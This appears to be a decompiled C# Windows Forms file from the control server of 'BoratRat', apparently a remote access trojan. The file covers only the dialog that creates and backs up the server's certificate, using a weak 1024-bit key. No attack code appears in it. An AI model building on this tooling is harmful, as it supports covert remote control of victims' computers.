// Server.Forms.FormCertificate
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Windows.Forms;
using DarkUI.Controls;
using DarkUI.Forms;
using Server;
using Server.Helper;

public class FormCertificate : DarkForm
{
	private IContainer components;

	private GroupBox groupBox1;

	private Label label1;

	private Button button1;

	private TextBox textBox1;

	public FormCertificate()
	{
		InitializeComponent();
	}

	private void FormCertificate_Load(object sender, EventArgs e)
	{
		try
		{
			string text = Application.StartupPath + "\\BackupCertificate.zip";
			if (File.Exists(text))
			{
				MessageBox.Show(this, "Found a zip backup, Extracting (BackupCertificate.zip)", "Certificate backup", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				ZipFile.ExtractToDirectory(text, Application.StartupPath);
				Settings.ServerCertificate = new X509Certificate2(Settings.CertificatePath);
				Close();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, ex.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}
	}

	private async void Button1_Click(object sender, EventArgs e)
	{
		try
		{
			if (string.IsNullOrWhiteSpace(textBox1.Text))
			{
				return;
			}
			button1.Text = "Please wait";
			button1.Enabled = false;
			textBox1.Enabled = false;
			Exception ex2;
			await Task.Run(delegate
			{
				try
				{
					string archiveFileName = Application.StartupPath + "\\BackupCertificate.zip";
					Settings.ServerCertificate = CreateCertificate.CreateCertificateAuthority(textBox1.Text, 1024);
					File.WriteAllBytes(Settings.CertificatePath, Settings.ServerCertificate.Export(X509ContentType.Pfx));
					using (ZipArchive destination = ZipFile.Open(archiveFileName, ZipArchiveMode.Create))
					{
						destination.CreateEntryFromFile(Settings.CertificatePath, Path.GetFileName(Settings.CertificatePath));
					}
					Program.form1.listView1.BeginInvoke((MethodInvoker)delegate
					{
						MessageBox.Show(this, "Remember to save the BackupCertificate.zip", "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
						Close();
					});
				}
				catch (Exception ex3)
				{
					ex2 = ex3;
					Program.form1.listView1.BeginInvoke((MethodInvoker)delegate
					{
						MessageBox.Show(this, ex2.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
						button1.Text = "OK";
						button1.Enabled = true;
						textBox1.Enabled = true;
					});
				}
			});
		}
		catch (Exception ex)
		{
			MessageBox.Show(this, ex.Message, "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			button1.Text = "Ok";
			button1.Enabled = true;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.groupBox1 = new DarkUI.Controls.DarkGroupBox();
		this.button1 = new DarkUI.Controls.DarkButton();
		this.textBox1 = new DarkUI.Controls.DarkTextBox();
		this.label1 = new DarkUI.Controls.DarkLabel();
		this.groupBox1.SuspendLayout();
		base.SuspendLayout();
		this.groupBox1.Controls.Add(this.button1);
		this.groupBox1.Controls.Add(this.textBox1);
		this.groupBox1.Controls.Add(this.label1);
		this.groupBox1.Location = new System.Drawing.Point(8, 8);
		this.groupBox1.Margin = new System.Windows.Forms.Padding(2);
		this.groupBox1.Name = "groupBox1";
		this.groupBox1.Padding = new System.Windows.Forms.Padding(2);
		this.groupBox1.Size = new System.Drawing.Size(252, 178);
		this.groupBox1.TabIndex = 0;
		this.groupBox1.TabStop = false;
		this.groupBox1.Text = "New Certificate";
		this.button1.Location = new System.Drawing.Point(7, 108);
		this.button1.Margin = new System.Windows.Forms.Padding(2);
		this.button1.Name = "button1";
		this.button1.Size = new System.Drawing.Size(218, 25);
		this.button1.TabIndex = 0;
		this.button1.Text = "OK";
		this.button1.UseVisualStyleBackColor = true;
		this.button1.Click += new System.EventHandler(Button1_Click);
		this.textBox1.Location = new System.Drawing.Point(7, 70);
		this.textBox1.Margin = new System.Windows.Forms.Padding(2);
		this.textBox1.Name = "textBox1";
		this.textBox1.Size = new System.Drawing.Size(218, 20);
		this.textBox1.TabIndex = 1;
		this.textBox1.Text = "BoratRat Server";
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(84, 40);
		this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(64, 13);
		this.label1.TabIndex = 0;
		this.label1.Text = "Sever name";
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(271, 197);
		base.ControlBox = false;
		base.Controls.Add(this.groupBox1);
		base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
		base.Margin = new System.Windows.Forms.Padding(2);
		base.Name = "FormCertificate";
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "Certificate";
		base.Load += new System.EventHandler(FormCertificate_Load);
		this.groupBox1.ResumeLayout(false);
		this.groupBox1.PerformLayout();
		base.ResumeLayout(false);
	}
}
